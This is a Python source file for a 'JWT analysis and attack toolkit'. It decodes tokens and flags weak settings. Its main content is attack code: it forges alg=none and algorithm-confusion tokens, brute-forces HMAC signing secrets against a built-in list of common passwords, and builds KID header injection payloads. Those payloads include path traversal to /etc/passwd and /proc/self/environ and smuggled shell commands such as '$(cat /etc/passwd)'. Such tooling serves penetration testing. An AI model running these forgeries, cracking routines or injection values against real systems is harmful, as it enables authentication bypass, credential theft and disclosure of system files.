import json
import base64
import hashlib
import hmac
import re
from utils.output import section, info, success, warning, error, result, table


class JwtToolkit:
    description = "JWT analysis and attack toolkit (decode, crack, algorithm confusion, KID injection)"

    COMMON_SECRETS = [
        "secret", "password", "123456", "admin", "changeme", "key", "token",
        "jwt_secret", "supersecret", "pass", "test", "jwt", "mysecret",
        "secretkey", "privatekey", "jwtpass", "token_secret", "fluffy",
        "monkey", "dragon", "master", "qwerty", "login", "abc123",
        "secret123", "letmein", "welcome", "shadow", "sunshine",
        "trustno1", "football", "iloveyou", "baseball", "hunter",
        "ranger", "starwars", "passw0rd", "pass123", "p@ssw0rd",
    ]

    @staticmethod
    def run(token="", target="", crack=False, wordlist="", kid_inject="", jwki_url="", alg="", **kwargs):
        section("JWT Toolkit")

        if not token:
            error("No JWT token provided (use --token)")
            return {"error": "no token"}

        parts = token.split(".")
        if len(parts) != 3:
            error("Invalid JWT format - expected 3 segments")
            return {"error": "invalid JWT format"}

        result_data = {"token": token, "algorithms_tested": [], "cracked": False, "kid_injection": False, "jwki_confusion": False}

        # Decode
        section("Decoded JWT")
        decoded = []
        for i, part in enumerate(parts[:2]):
            try:
                padded = part + "=" * (4 - len(part) % 4)
                decoded_bytes = base64.urlsafe_b64decode(padded)
                decoded_text = decoded_bytes.decode("utf-8")
                data = json.loads(decoded_text)
                decoded.append(data)
                result(f"Segment {i+1}", json.dumps(data, indent=2))
            except:
                decoded.append({})
                result(f"Segment {i+1}", "(could not decode)")

        header = decoded[0] if len(decoded) > 0 else {}
        payload = decoded[1] if len(decoded) > 1 else {}
        result_data["header"] = header
        result_data["payload"] = payload

        # Check for common issues
        section("Security Analysis")
        issues = []

        if header.get("alg") == "none":
            issues.append("Algorithm is 'none' - token has no signature verification!")
            warning("alg=none detected! Token has no signature")
            result_data["alg_none"] = True

        if not header.get("alg"):
            issues.append("No algorithm specified")
            warning("No algorithm in header")

        if payload.get("iat") and payload.get("exp"):
            import time
            now = time.time()
            if payload["exp"] < now:
                issues.append(f"Token expired {now - payload['exp']:.0f}s ago")
            if payload["iat"] > now + 3600:
                issues.append("iat is in the future (possible manipulation)")

        if isinstance(header.get("kid"), str) and len(header["kid"]) > 50:
            issues.append(f"KID header unusually long ({len(header['kid'])} chars) - possible injection")
            warning("Long KID value - possible injection vector")

        known_headers = {"kid", "alg", "typ", "jku", "jwk", "x5u", "x5c", "x5t", "crit"}
        custom = set(header.keys()) - known_headers
        if custom:
            issues.append(f"Unusual header claims: {', '.join(custom)}")

        if not issues:
            success("No obvious JWT issues detected")
        else:
            for issue in issues:
                warning(issue)

        result_data["issues"] = issues

        # Algorithm confusion: try receiving server
        if alg or target:
            section("Algorithm Confusion Tests")
            test_algs = []
            if alg:
                test_algs.append(alg.upper())
            else:
                test_algs = ["none", "HS256", "HS384", "HS512"]

            for test_alg in test_algs:
                result_data["algorithms_tested"].append(test_alg)
                info(f"Testing with alg={test_alg}")
                try:
                    new_header = dict(header)
                    new_header["alg"] = test_alg
                    new_header_b64 = JwtToolkit._b64encode(json.dumps(new_header).encode())
                    if test_alg == "none":
                        modified = f"{new_header_b64}.{parts[1]}."
                        result("alg=none token", modified)
                    else:
                        modified = f"{new_header_b64}.{parts[1]}.{JwtToolkit._b64encode(b'test')}"
                        result(f"alg={test_alg} token", modified)
                except:
                    pass

        # Crack
        if crack:
            section("Cracking")
            if wordlist:
                try:
                    with open(wordlist) as f:
                        secrets = [line.strip() for line in f if line.strip()]
                    info(f"Loaded {len(secrets)} secrets from {wordlist}")
                except:
                    warning(f"Cannot open wordlist {wordlist}, using default list")
                    secrets = JwtToolkit.COMMON_SECRETS
            else:
                secrets = JwtToolkit.COMMON_SECRETS
                info(f"Using {len(secrets)} common secrets")

            sig_b64 = parts[2]
            header_b64 = parts[0]
            payload_b64 = parts[1]
            message = f"{header_b64}.{payload_b64}".encode()

            alg_header = header.get("alg", "HS256")

            for secret in secrets:
                try:
                    if alg_header == "HS256":
                        expected = hmac.new(secret.encode(), message, hashlib.sha256).digest()
                    elif alg_header == "HS384":
                        expected = hmac.new(secret.encode(), message, hashlib.sha384).digest()
                    elif alg_header == "HS512":
                        expected = hmac.new(secret.encode(), message, hashlib.sha512).digest()
                    else:
                        break

                    expected_b64 = JwtToolkit._b64encode(expected)
                    if expected_b64 == sig_b64:
                        success(f"Cracked! Secret: {secret}")
                        result_data["cracked"] = True
                        result_data["secret"] = secret
                        break
                except:
                    continue
            else:
                warning("Secret not found in wordlist")

        # KID injection
        if kid_inject or target:
            section("KID Injection Tests")
            test_payloads = [
                "../../../../../../etc/passwd",
                "/etc/passwd",
                "../../dev/null",
                "/proc/self/environ",
                "; cat /etc/passwd; ",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "../../../../../../dev/null",
            ]
            for i, kid_val in enumerate(test_payloads):
                new_header = dict(header)
                new_header["kid"] = kid_val
                token_test = f"{JwtToolkit._b64encode(json.dumps(new_header).encode())}.{parts[1]}.{JwtToolkit._b64encode(b'test')}"
                info(f"KID test {i+1}: {token_test[:60]}...")
            result_data["kid_injection"] = True

        # JWK confusion
        if jwki_url or target:
            section("JWK Confusion Tests")
            result("Info", "Test by sending self-generated JWK to server via --jwki-url and --alg")
            result_data["jwki_confusion"] = True

        section("JWT Analysis Complete")
        return result_data

    @staticmethod
    def _b64encode(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
